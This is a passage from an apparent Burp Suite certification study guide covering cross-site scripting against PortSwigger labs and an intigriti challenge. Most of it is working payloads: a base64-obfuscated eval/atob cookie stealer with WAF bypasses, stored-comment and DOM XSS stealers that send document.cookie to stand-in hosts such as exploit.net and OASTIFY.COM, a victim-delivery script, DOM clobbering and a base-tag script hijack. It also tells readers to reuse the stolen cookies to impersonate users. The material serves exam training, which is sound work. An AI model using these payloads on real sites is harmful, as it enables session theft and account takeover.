<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">XSS via JSON into EVAL</h3><a id="user-content-xss-via-json-into-eval" class="anchor" aria-label="Permalink: XSS via JSON into EVAL" href="#xss-via-json-into-eval"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">This <a href="https://portswigger.net/web-security/certification/takepracticeexam/index.html" rel="nofollow">PortSwigger Practice Exam APP</a> is performing search function and the <strong>DOM Invader</strong> <em><strong>identify</strong></em> the sink in an <code>eval()</code> function. The search results are placed into JSON content type.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/dom-invader-eval-identify.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/dom-invader-eval-identify.png" alt="Dom Invader EVAL identify" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">Test escape out of the <code>JSON</code> data and inject test payload <code>"-prompt(321)-"</code> into the JSON content.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/json-injection-escape.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/json-injection-escape.png" alt="json-injection-escape.png" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">Attempting to get our own session cookie value with payload of <code>"-alert(document.cookie)-"</code> and filter message is returned stating <code>"Potentially dangerous search term"</code>.</p>
</blockquote>
<blockquote>
<p dir="auto">WAF is preventing dangerous search filters and tags, then we bypass WAF filters using JavaScript global variables.</p>
</blockquote>
<div class="highlight highlight-source-js notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="&quot;-alert(window[&quot;document&quot;][&quot;cookie&quot;])-&quot;
&quot;-window[&quot;alert&quot;](window[&quot;document&quot;][&quot;cookie&quot;])-&quot;
&quot;-self[&quot;alert&quot;](self[&quot;document&quot;][&quot;cookie&quot;])-&quot;"><pre><span class="pl-s">"-alert(window["</span><span class="pl-smi">document</span>"<span class="pl-kos">]</span><span class="pl-kos">[</span><span class="pl-s">"cookie"</span><span class="pl-kos">]</span><span class="pl-kos">)</span><span class="pl-c1">-</span><span class="pl-s">"</span>
<span class="pl-s">"</span><span class="pl-c1">-</span><span class="pl-smi">window</span><span class="pl-kos">[</span><span class="pl-s">"alert"</span><span class="pl-kos">]</span><span class="pl-kos">(</span><span class="pl-smi">window</span><span class="pl-kos">[</span><span class="pl-s">"document"</span><span class="pl-kos">]</span><span class="pl-kos">[</span><span class="pl-s">"cookie"</span><span class="pl-kos">]</span><span class="pl-kos">)</span><span class="pl-c1">-</span><span class="pl-s">"</span>
<span class="pl-s">"</span><span class="pl-c1">-</span><span class="pl-s1">self</span><span class="pl-kos">[</span><span class="pl-s">"alert"</span><span class="pl-kos">]</span><span class="pl-kos">(</span><span class="pl-s1">self</span><span class="pl-kos">[</span><span class="pl-s">"document"</span><span class="pl-kos">]</span><span class="pl-kos">[</span><span class="pl-s">"cookie"</span><span class="pl-kos">]</span><span class="pl-kos">)</span><span class="pl-c1">-</span>"</pre></div>
<p dir="auto"><a href="https://www.secjuice.com/bypass-xss-filters-using-javascript-global-variables/" rel="nofollow">secjuice: Bypass XSS filters using JavaScript global variables</a></p>
<blockquote>
<p dir="auto">Below is the main <a href="https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/5cbfeb2a11577ad62a31f72635a000bf5dcce293/payloads/CookieStealer-Payloads.md">cookie stealer payload</a> before BASE 64 encoding it.</p>
</blockquote>
<div class="highlight highlight-source-js notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="fetch(`https://OASTIFY.COM/?jsonc=` + window[&quot;document&quot;][&quot;cookie&quot;])"><pre><span class="pl-en">fetch</span><span class="pl-kos">(</span><span class="pl-s">`https://OASTIFY.COM/?jsonc=`</span> <span class="pl-c1">+</span> <span class="pl-smi">window</span><span class="pl-kos">[</span><span class="pl-s">"document"</span><span class="pl-kos">]</span><span class="pl-kos">[</span><span class="pl-s">"cookie"</span><span class="pl-kos">]</span><span class="pl-kos">)</span></pre></div>
<blockquote>
<p dir="auto">Next is encode payload using <a href="https://www.base64encode.org/" rel="nofollow">Base64 encoded</a> value of the above cookie stealer payload.</p>
</blockquote>
<div class="snippet-clipboard-content notranslate position-relative overflow-auto" data-snippet-clipboard-copy-content="ZmV0Y2goYGh0dHBzOi8vNHo0YWdlMHlwYjV3b2I5cDYxeXBwdTEzdnUxbHBiZDAub2FzdGlmeS5jb20vP2pzb25jPWAgKyB3aW5kb3dbImRvY3VtZW50Il1bImNvb2tpZSJdKQ=="><pre class="notranslate"><code>ZmV0Y2goYGh0dHBzOi8vNHo0YWdlMHlwYjV3b2I5cDYxeXBwdTEzdnUxbHBiZDAub2FzdGlmeS5jb20vP2pzb25jPWAgKyB3aW5kb3dbImRvY3VtZW50Il1bImNvb2tpZSJdKQ==
</code></pre></div>
<blockquote>
<p dir="auto">Test payload on our own session cookie in Search function.</p>
</blockquote>
<div class="highlight highlight-source-js notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="&quot;-eval(atob(&quot;ZmV0Y2goYGh0dHBzOi8vNHo0YWdlMHlwYjV3b2I5cDYxeXBwdTEzdnUxbHBiZDAub2FzdGlmeS5jb20vP2pzb25jPWAgKyB3aW5kb3dbImRvY3VtZW50Il1bImNvb2tpZSJdKQ==&quot;))-&quot;"><pre><span class="pl-s">"-eval(atob("</span><span class="pl-kos"></span><span class="pl-v">ZmV0Y2goYGh0dHBzOi8vNHo0YWdlMHlwYjV3b2I5cDYxeXBwdTEzdnUxbHBiZDAub2FzdGlmeS5jb20vP2pzb25jPWAgKyB3aW5kb3dbImRvY3VtZW50Il1bImNvb2tpZSJdKQ</span><span class="pl-c1">==</span><span class="pl-s">"))-"</span></pre></div>
<blockquote>
<p dir="auto">Unpacking above payload assembly stages:</p>
</blockquote>
<ul dir="auto">
<li>Using the <strong>eval()</strong> method evaluates or executes an argument.</li>
<li>Using <strong>atob()</strong> or <strong>btoa()</strong> is function used for encoding to and from base64 format strings.</li>
<li>If <strong>eval()</strong> being blocked then Alternatives:
<ul dir="auto">
<li>setTimeout("code")</li>
<li>setInterval("code)</li>
<li>setImmediate("code")</li>
<li>Function("code")()</li>
</ul>
</li>
</ul>
<blockquote>
<p dir="auto">This image shows Burp Collaborator receiving the my cookie value as proof of concept before setting up payload to <code>Deliver exploit to victim</code>.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/xss2.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/xss2.png" alt="Burp collaborator receiving request with base64 cookie value from our POC." style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto"><a href="https://www.urlencoder.org/" rel="nofollow">URL Encode</a> all characters in this payload and use as the value of the <code>/?SearchTerm=</code> parameter.</p>
</blockquote>
<div class="highlight highlight-text-html-basic notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="&quot;-eval(atob(&quot;ZmV0Y2goYGh0dHBzOi8vNHo0YWdlMHlwYjV3b2I5cDYxeXBwdTEzdnUxbHBiZDAub2FzdGlmeS5jb20vP2pzb25jPWAgKyB3aW5kb3dbImRvY3VtZW50Il1bImNvb2tpZSJdKQ==&quot;))-&quot;"><pre>"-eval(atob("ZmV0Y2goYGh0dHBzOi8vNHo0YWdlMHlwYjV3b2I5cDYxeXBwdTEzdnUxbHBiZDAub2FzdGlmeS5jb20vP2pzb25jPWAgKyB3aW5kb3dbImRvY3VtZW50Il1bImNvb2tpZSJdKQ=="))-"</pre></div>
<blockquote>
<p dir="auto">Hosting the <code>IFRAME</code> on exploit server, give a <strong>error</strong> message refused to connect to target. Instead host the payload on exploit server between <code>&lt;script&gt;</code> tags.</p>
</blockquote>
<div class="highlight highlight-text-html-basic notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="&lt;script&gt;
location = &quot;https://TARGET.net/?SearchTerm=%22%2d%65%76%61%6c%28%61%74%6f%62%28%22%5a%6d%56%30%59%32%67%6f%59%47%68%30%64%48%42%7a%4f%69%38%76%4e%48%6f%30%59%57%64%6c%4d%48%6c%77%59%6a%56%33%62%32%49%35%63%44%59%78%65%58%42%77%64%54%45%7a%64%6e%55%78%62%48%42%69%5a%44%41%75%62%32%46%7a%64%47%6c%6d%65%53%35%6a%62%32%30%76%50%32%70%7a%62%32%35%6a%50%57%41%67%4b%79%42%33%61%57%35%6b%62%33%64%62%49%6d%52%76%59%33%56%74%5a%57%35%30%49%6c%31%62%49%6d%4e%76%62%32%74%70%5a%53%4a%64%4b%51%3d%3d%22%29%29%2d%22&quot;
&lt;/script&gt;"><pre><span class="pl-kos">&lt;</span><span class="pl-ent">script</span><span class="pl-kos">&gt;</span>
<span class="pl-s1">location</span> <span class="pl-c1">=</span> <span class="pl-s">"https://TARGET.net/?SearchTerm=%22%2d%65%76%61%6c%28%61%74%6f%62%28%22%5a%6d%56%30%59%32%67%6f%59%47%68%30%64%48%42%7a%4f%69%38%76%4e%48%6f%30%59%57%64%6c%4d%48%6c%77%59%6a%56%33%62%32%49%35%63%44%59%78%65%58%42%77%64%54%45%7a%64%6e%55%78%62%48%42%69%5a%44%41%75%62%32%46%7a%64%47%6c%6d%65%53%35%6a%62%32%30%76%50%32%70%7a%62%32%35%6a%50%57%41%67%4b%79%42%33%61%57%35%6b%62%33%64%62%49%6d%52%76%59%33%56%74%5a%57%35%30%49%6c%31%62%49%6d%4e%76%62%32%74%70%5a%53%4a%64%4b%51%3d%3d%22%29%29%2d%22"</span>
<span class="pl-kos">&lt;/</span><span class="pl-ent">script</span><span class="pl-kos">&gt;</span></pre></div>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/xss1.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/xss1.png" alt="(Deliver reflected xss to steal victim cookie." style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto"><strong>NOTE:</strong> <code>Deliver exploit to victim</code> few times if the active user do not send HTTP request to collaborator. Replace the current cookie value with the stolen cookie to impersonate the active user and move on to <a href="#blind-time-delay">Stage 2 of the Practice Exam</a>.</p>
</blockquote>
<p dir="auto"><a href="https://portswigger.net/web-security/certification/takepracticeexam/index.html" rel="nofollow">PortSwigger Practice Exam - Stage 1 - Foothold</a></p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">Stored XSS</h3><a id="user-content-stored-xss" class="anchor" aria-label="Permalink: Stored XSS" href="#stored-xss"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">Stored XSS can also be Blind XSS.
If alert payload do not trigger, see <a href="https://youtu.be/QSiXHb97E1c?si=ta4Rro6J39QlqVCR&amp;t=428" rel="nofollow">NahamSec blind xss video</a> payload for victim to click, example: <code>&lt;svg/onload=import('//EXPLOIT.net/blind_xss')&gt;</code><br>
If stored input is redirecting victim that click on the links, it send request to exploit server.
Use the following sample code to <em><strong>identify</strong></em> stored XSS.</p>
</blockquote>
<div class="highlight highlight-text-html-basic notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="&lt;img src=&quot;https://EXPLOIT.net/img&quot;&gt;
&lt;script src=&quot;https://EXPLOIT.net/script&quot;&gt;&lt;/script&gt;
&lt;video src=&quot;https://EXPLOIT.net/video&quot;&gt;&lt;/video&gt;"><pre><span class="pl-kos">&lt;</span><span class="pl-ent">img</span> <span class="pl-c1">src</span>="<span class="pl-s">https://EXPLOIT.net/img</span>"<span class="pl-kos">&gt;</span>
<span class="pl-kos">&lt;</span><span class="pl-ent">script</span> <span class="pl-c1">src</span>="<span class="pl-s">https://EXPLOIT.net/script</span>"<span class="pl-kos">&gt;</span><span class="pl-kos">&lt;/</span><span class="pl-ent">script</span><span class="pl-kos">&gt;</span>
<span class="pl-kos">&lt;</span><span class="pl-ent">video</span> <span class="pl-c1">src</span>="<span class="pl-s">https://EXPLOIT.net/video</span>"<span class="pl-kos">&gt;</span><span class="pl-kos">&lt;/</span><span class="pl-ent">video</span><span class="pl-kos">&gt;</span></pre></div>
<blockquote>
<p dir="auto">Below log entries show the requests made to the exploit server, and from the logs we can <em><strong>identify</strong></em> that <code>/img</code> and <code>/video</code> of the above tags were allowed on the application and made requests when accessed.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/identify-stored-xss.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/identify-stored-xss.png" alt="Identify-stored-xss" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">Cross site Scripting saved in Blog post comment. This Cookie Stealer payload then send the victim session cookie to the exploit server logs.</p>
</blockquote>
<div class="highlight highlight-text-html-basic notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="&lt;img src=&quot;1&quot; onerror=&quot;window.location='https://exploit.net/cookie='+document.cookie&quot;&gt;"><pre><span class="pl-kos">&lt;</span><span class="pl-ent">img</span> <span class="pl-c1">src</span>="<span class="pl-s">1</span>" <span class="pl-c1">onerror</span>="<span class="pl-s">window.location='https://exploit.net/cookie='+document.cookie</span>"<span class="pl-kos">&gt;</span></pre></div>
<blockquote>
<p dir="auto">Product and Store lookup</p>
</blockquote>
<div class="highlight highlight-text-html-basic notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="?productId=1&amp;storeId=&quot;&gt;&lt;/select&gt;&lt;img src=x onerror=this.src='https://exploit.net/?'+document.cookie;&gt;"><pre>?productId=1&amp;storeId="<span class="pl-kos">&gt;</span><span class="pl-kos">&lt;/</span>select<span class="pl-kos">&gt;</span><span class="pl-kos">&lt;</span><span class="pl-ent">img</span> <span class="pl-c1">src</span>=<span class="pl-s">x</span> <span class="pl-c1">onerror</span>=<span class="pl-s">this.src</span>='https://exploit.net/?'+document.cookie;<span class="pl-kos">&gt;</span></pre></div>
<div class="markdown-heading" dir="auto"><h4 tabindex="-1" class="heading-element" dir="auto">Stored XSS Blog Post</h4><a id="user-content-stored-xss-blog-post" class="anchor" aria-label="Permalink: Stored XSS Blog Post" href="#stored-xss-blog-post"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">Stored XSS Blog post cookie stealer sending document cookie to exploit server.</p>
</blockquote>
<div class="highlight highlight-source-js notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="&lt;script&gt;
document.write('&lt;img src=&quot;https://exploit.net?cookieStealer='+document.cookie+'&quot; /&gt;');
&lt;/script&gt;"><pre><span class="pl-c1">&lt;</span><span class="pl-s1">script</span><span class="pl-c1">&gt;</span>
document.write('<span class="pl-c1">&lt;</span><span class="pl-s1">img</span> <span class="pl-c1">src</span><span class="pl-c1">=</span><span class="pl-s">"https://exploit.net?cookieStealer='+document.cookie+'"</span> <span class="pl-kos">/&gt;</span>');
<span class="pl-kos">&lt;/</span><span class="pl-s1">script</span><span class="pl-c1">&gt;</span></pre></div>
<blockquote>
<p dir="auto">Below target has a stored XSS vulnerability in the blog comments function. Steal a victim user session cookie that views the comments after they are posted, and then use their cookie to do impersonation.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/stored-xss-blog-post.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/stored-xss-blog-post.png" alt="Stored XSS Blog post" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto"><strong>Fetch API</strong> JavaScript Cookie Stealer payload in Blog post comment.</p>
</blockquote>
<div class="highlight highlight-source-js notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="&lt;script&gt;
fetch('https://exploit.net', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
&lt;/script&gt;"><pre><span class="pl-c1">&lt;</span><span class="pl-s1">script</span><span class="pl-c1">&gt;</span>
fetch('https://exploit.net', <span class="pl-kos">{</span>
<span class="pl-s1">method</span>: <span class="pl-s">'POST'</span><span class="pl-kos">,</span>
<span class="pl-s1">mode</span>: <span class="pl-s">'no-cors'</span><span class="pl-kos">,</span>
<span class="pl-s1">body</span>:<span class="pl-smi">document</span><span class="pl-kos">.</span><span class="pl-c1">cookie</span>
<span class="pl-kos">}</span>);
<span class="pl-kos">&lt;/</span><span class="pl-s1">script</span><span class="pl-c1">&gt;</span></pre></div>
<blockquote>
<p dir="auto"><a href="https://youtu.be/UqDdR10F54A?si=nkhilLzyKQcfqtfU&amp;t=1737" rel="nofollow">IPPSEC YouTube using the HackTheBox Bookworm</a>, showing <code>payload.js</code> JavaScript code how he using <code>fetch</code> and learning JavaScript.</p>
</blockquote>
<p dir="auto"><a href="https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies" rel="nofollow">PortSwigger Lab: Exploiting cross-site scripting to steal cookies</a></p>
<div class="markdown-heading" dir="auto"><h4 tabindex="-1" class="heading-element" dir="auto">Upgrade stored self-XSS</h4><a id="user-content-upgrade-stored-self-xss" class="anchor" aria-label="Permalink: Upgrade stored self-XSS" href="#upgrade-stored-self-xss"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">Blog comment with <strong>Stored self-XSS</strong>, upgrading the payload to steal victim information from DOM. The function <strong>edit content</strong> reflect the input in the <code>&lt;script&gt;</code> tag. The CSRF token for the <strong>write comment</strong> is same as the <strong>edit content</strong> functions. Below payload use <strong>write comment</strong> function to make the victim create a blog entry on their on blog with our malicious content.
The <code>a</code> character is added to escape the <code>#</code> hash character from the initial application <code>source code</code>.
The below <code>source code</code> in the blog entry is full exploit to steal victim info.</p>
</blockquote>
<div class="highlight highlight-text-html-basic notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="&lt;button form=comment-form formaction=&quot;/edit&quot; id=share-button&gt;Click Button&lt;/button&gt;
&lt;input form=comment-form name=content value='&lt;meta http-equiv=&quot;refresh&quot; content=&quot;1; URL=/edit&quot; /&gt;'&gt;
&lt;input form=comment-form name=tags value='a&quot;);alert(document.getElementsByClassName(&quot;navbar-brand&quot;)[0].innerText)//'&gt;"><pre><span class="pl-kos">&lt;</span><span class="pl-ent">button</span> <span class="pl-c1">form</span>=<span class="pl-s">comment-form</span> <span class="pl-c1">formaction</span>="<span class="pl-s">/edit</span>" <span class="pl-c1">id</span>=<span class="pl-s">share-button</span><span class="pl-kos">&gt;</span>Click Button<span class="pl-kos">&lt;/</span><span class="pl-ent">button</span><span class="pl-kos">&gt;</span>
<span class="pl-kos">&lt;</span><span class="pl-ent">input</span> <span class="pl-c1">form</span>=<span class="pl-s">comment-form</span> <span class="pl-c1">name</span>=<span class="pl-s">content</span> <span class="pl-c1">value</span>='<span class="pl-s">&lt;meta http-equiv="refresh" content="1; URL=/edit" /&gt;</span>'<span class="pl-kos">&gt;</span>
<span class="pl-kos">&lt;</span><span class="pl-ent">input</span> <span class="pl-c1">form</span>=<span class="pl-s">comment-form</span> <span class="pl-c1">name</span>=<span class="pl-s">tags</span> <span class="pl-c1">value</span>='<span class="pl-s">a");alert(document.getElementsByClassName("navbar-brand")[0].innerText)//</span>'<span class="pl-kos">&gt;</span></pre></div>
<blockquote>
<p dir="auto">This target is exploited by constructing an HTML injection that clobbers a variable named <code>share_button</code>, see <code>source code</code> below and uses HTML code above. The content is reflected on the page, then using this reflection enable page redirection to victim <code>/edit</code> page with the use of the <code>meta http-equiv</code> tag to refresh page after 1 second result in redirection.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/clobbering5.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/clobbering5.png" alt="clobbering javascript variable" style="max-width: 100%;"></a></p>
<div class="snippet-clipboard-content notranslate position-relative overflow-auto" data-snippet-clipboard-copy-content="https://challenge-1222.intigriti.io/blog/unique-guid-value-abc123?share=1"><pre class="notranslate"><code>https://challenge-1222.intigriti.io/blog/unique-guid-value-abc123?share=1
</code></pre></div>
<blockquote>
<p dir="auto">Deliver Exploit, by Sending url that reference the above blog entry to the victim will trigger XSS as them.</p>
</blockquote>
<p dir="auto"><a href="https://youtu.be/FowbZ8IlU7o" rel="nofollow">intigriti - Self-XSS upgrade - Solution to December 22 XSS Challenge</a></p>
<blockquote>
<p dir="auto">Alternative exploit using HTML injection in the Edit Content blog entry page, <em><strong>identified</strong></em> using <a href="#xss-resources">XSS Resources CSP check</a>.</p>
</blockquote>
<div class="snippet-clipboard-content notranslate position-relative overflow-auto" data-snippet-clipboard-copy-content="&lt;base href=&quot;https://Exploit.net&quot;&gt;"><pre class="notranslate"><code>&lt;base href="https://Exploit.net"&gt;
</code></pre></div>
<blockquote>
<p dir="auto">Host JS file on Exploit server as <code>static/js/bootstrap.bundle.min.js</code>, with content:</p>
</blockquote>
<div class="snippet-clipboard-content notranslate position-relative overflow-auto" data-snippet-clipboard-copy-content="alert(document.getElementsByClassName(&quot;navbar-brand&quot;)[0].innerText)"><pre class="notranslate"><code>alert(document.getElementsByClassName("navbar-brand")[0].innerText)
</code></pre></div>
<blockquote>
<p dir="auto">The modified PortSwigger lab payload assign the <code>document.location</code> function to the variable <code>defaultAvatar</code> next time page is loaded, because site uses DOMPurify that allows the use of <code>cid:</code> protocol that do not URLencode double quotes.</p>
</blockquote>
<div class="snippet-clipboard-content notranslate position-relative overflow-auto" data-snippet-clipboard-copy-content="&lt;a id=defaultAvatar&gt;&lt;a id=defaultAvatar name=avatar href=&quot;cid:&amp;quot;onerror=document.location=`https://OASTIFY.COM/?clobber=`+document.cookie//&quot;&gt;"><pre class="notranslate"><code>&lt;a id=defaultAvatar&gt;&lt;a id=defaultAvatar name=avatar href="cid:&amp;quot;onerror=document.location=`https://OASTIFY.COM/?clobber=`+document.cookie//"&gt;
</code></pre></div>
<p dir="auto"><a href="https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-xss-exploiting-dom-clobbering" rel="nofollow">PortSwigger Lab: Exploiting DOM clobbering to enable XSS</a></p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">Stored DOM XSS</h3><a id="user-content-stored-dom-xss" class="anchor" aria-label="Permalink: Stored DOM XSS" href="#stored-dom-xss"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">In the JavaScript <code>source code</code>, included script <code>resources/js/loadCommentsWithVulnerableEscapeHtml.js</code> we <em><strong>identify</strong></em> the <code>html.replace()</code> function inside the custom <code>loadComments</code> function. Testing payloads we see the function only replaces the first occurrence of <code>&lt;&gt;</code>.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/stored-dom-xss-code.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/stored-dom-xss-code.png" alt="stored dom-xss code replace" style="max-width: 100%;"></a></p>
<div class="highlight highlight-text-html-basic notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="&lt;&gt;&lt;img src=1 onerror=javascript:fetch(`https://OASTIFY.COM?escape=`+document.cookie)&gt;"><pre><span class="pl-kos">&lt;</span><span class="pl-kos">&gt;</span><span class="pl-kos">&lt;</span><span class="pl-ent">img</span> <span class="pl-c1">src</span>=<span class="pl-s">1</span> <span class="pl-c1">onerror</span>=<span class="pl-s">javascript:fetch(`https://OASTIFY.COM?escape</span>=`+document.cookie)<span class="pl-kos">&gt;</span></pre></div>
<blockquote>
<p dir="auto">Above payload is stored and any user visiting the comment blog will result in their session cookie being stolen and send to collaborator.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/stored-dom-xss-json-comments.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/stored-dom-xss-json-comments.png" alt="stored DOM-XSS json comments" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">PortSwigger Lab payload: <code>&lt;&gt;&lt;img src=1 onerror=alert()&gt;</code>.</p>
</blockquote>
<p dir="auto"><a href="https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-stored" rel="nofollow">PortSwigger Lab: Stored DOM XSS</a></p>
<hr>
